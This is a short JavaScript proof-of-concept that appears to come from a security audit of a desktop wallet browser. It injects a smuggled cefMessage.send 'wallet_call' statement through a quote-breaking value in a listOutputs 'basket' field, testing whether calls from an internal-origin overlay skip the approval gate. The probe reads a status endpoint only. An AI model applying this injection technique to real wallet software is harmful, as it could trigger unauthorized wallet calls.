// P0.5 panel #3 blocker — the ESCALATION leg. Same overlay JS injection as
// modal_inject.js, but the injected statement is a `wallet_call` IPC rather
// than a fetch(). The finding's core claim: a wallet_call issued from the
// notification overlay (an IsInternalOrigin 127.0.0.1:5137 document) is
// direct-dispatched with NO X-Requesting-Domain and NO gate.
//
// DISCRIMINATOR, measured against the fetch() leg on the same box:
//   fetch()        -> interceptor stamps domain 127.0.0.1:5137 -> 202 domain_approval
//   wallet_call    -> if internal-origin bypass holds -> GET /wallet/status?<mk>
//                     reaches the wallet as 200 with NO prompt at all.
// A distinctive query marker on the endpoint ties the log line to THIS probe.
// /wallet/status is read-only — no money.
(function () {
  var marker = 'WCINJ_p3_' + Date.now();
  var bs = String.fromCharCode(92);   // backslash
  var q  = String.fromCharCode(39);   // single quote
  var bt = String.fromCharCode(96);   // backtick
  // cefMessage.send(`wallet_call`,[`<mk>`,`s`,`/wallet/status?<mk>`,`{}`,`GET`])
  var ep = '/wallet/status?' + marker;
  var call = 'cefMessage.send(' + bt + 'wallet_call' + bt + ',['
           + bt + marker + bt + ',' + bt + 's' + bt + ','
           + bt + ep + bt + ',' + bt + '{}' + bt + ',' + bt + 'GET' + bt + '])';
  var basket = 'backup-INJ' + bs + q + ');' + call + '}' + '//';
  window.__hodos_walletCall(
    'listOutputs', '/listOutputs', { basket: basket, tags: [] }, 'POST');
  return JSON.stringify({ href: location.href, fired: true, marker: marker,
                          basket: basket });
})()
